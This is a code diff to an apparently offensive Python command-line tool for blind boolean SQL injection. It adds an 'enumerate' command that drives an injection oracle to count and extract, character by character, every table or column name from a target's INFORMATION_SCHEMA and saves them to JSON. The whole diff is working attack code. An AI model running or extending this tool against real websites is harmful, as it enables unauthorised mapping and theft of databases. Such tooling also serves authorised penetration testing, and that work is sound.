@@ -22,6 +22,7 @@ from .engine import ExfiltrationEngine
 from .logging_util import Logger
 from .oracle import BooleanOracle, CalibrationError
 from .predictor import CharacterPredictor
+from .sequence import SequencePredictor
 from .reporting import NullReporter, TerminalReporter
 from .scope import ScopeError
 from . import targets as targets_mod
@@ -88,6 +89,18 @@ def build_parser() -> argparse.ArgumentParser:
     ex.add_argument("--preset", choices=["first-table", "db-name"],
                     help="use a built-in target instead of --expr")
     ex.add_argument("--output", dest="output_file")
+
+    en = sub.add_parser("enumerate", help="extract every value of a metadata set (e.g. all table names)")
+    add_common(en)
+    en.add_argument("--what", choices=["tables", "columns"], default="tables",
+                    help="what to enumerate (default: tables)")
+    en.add_argument("--table", dest="table", help="table name (required for --what columns)")
+    en.add_argument("--limit", dest="limit", type=int, default=0, help="max rows (0 = all)")
+    en.add_argument("--max-count", dest="max_count", type=int, default=4096)
+    en.add_argument("--charset", dest="charset")
+    en.add_argument("--max-length", dest="max_length", type=int)
+    en.add_argument("--strategy", dest="strategy", choices=["adaptive", "linear", "binary"])
+    en.add_argument("--output", dest="output_file")
 
     cal = sub.add_parser("calibrate", help="probe target and show true/false fingerprints")
     add_common(cal)
@@ -190,6 +203,68 @@ def cmd_extract(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
     return 0 if result.complete else 1
 
 
+def cmd_enumerate(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
+    reporter = NullReporter() if cfg.verbosity == 0 else TerminalReporter(verbosity=cfg.verbosity)
+    oracle = BooleanOracle(cfg, logger=logger)
+    engine = ExfiltrationEngine(
+        cfg, oracle,
+        char_predictor=CharacterPredictor(cfg.charset, order=cfg.predictor_order),
+        seq_predictor=SequencePredictor(min_prefix=cfg.min_seq_prefix),
+        logger=logger, reporter=reporter,
+    )
+    dialect = get_dialect(cfg.dialect)
+    if cfg.collation is not None:
+        dialect.collation = cfg.collation or None
+
+    what = getattr(args, "what", "tables")
+    if what == "columns":
+        if not getattr(args, "table", None):
+            logger.error("--what columns requires --table")
+            return 2
+        tbl = args.table.replace("'", "''")
+        count_expr = f"(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tbl}')"
+        row = lambda i: targets_mod.first_column_name(dialect, args.table, offset=i)
+    else:
+        count_expr = "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)"
+        row = lambda i: targets_mod.first_table_name(dialect, offset=i)
+
+    logger.info(f"Enumerating {what} from {cfg.target_url}")
+    try:
+        total = engine.discover_count(count_expr, max_count=getattr(args, "max_count", 4096))
+    except CalibrationError as exc:
+        logger.error(f"calibration failed: {exc}")
+        return 2
+    if total is None:
+        logger.error("could not determine the row count")
+        return 2
+    if getattr(args, "limit", 0):
+        total = min(total, args.limit)
+    logger.info(f"{total} {what} to extract")
+
+    rows = []
+    all_complete = True
+    for i in range(total):
+        result = engine.extract(row(i))
+        rows.append({"offset": i, "value": result.value, "complete": result.complete})
+        all_complete = all_complete and result.complete
+        logger.info(f"[{i}] {result.value!r}{'' if result.complete else ' (partial)'}")
+
+    out = {
+        "what": what,
+        "table": getattr(args, "table", None),
+        "count": total,
+        "values": [r["value"] for r in rows],
+        "rows": rows,
+        "requests_completed": oracle.requests_completed,
+        "requests_failed": oracle.requests_failed,
+    }
+    with open(cfg.output_file, "w", encoding="utf-8") as fh:
+        json.dump(out, fh, indent=2)
+    logger.info(f"wrote {cfg.output_file}")
+    print(json.dumps(out, indent=2))
+    return 0 if all_complete else 1
+
+
 # ----------------------------------------------------------------- entry
 def main(argv: Optional[list] = None) -> int:
     parser = build_parser()
@@ -213,6 +288,8 @@ def main(argv: Optional[list] = None) -> int:
             return cmd_calibrate(cfg, logger)
         if args.command == "extract":
             return cmd_extract(cfg, args, logger)
+        if args.command == "enumerate":
+            return cmd_enumerate(cfg, args, logger)
     except ScopeError as exc:
         print(f"scope error: {exc}", file=sys.stderr)
         return 3
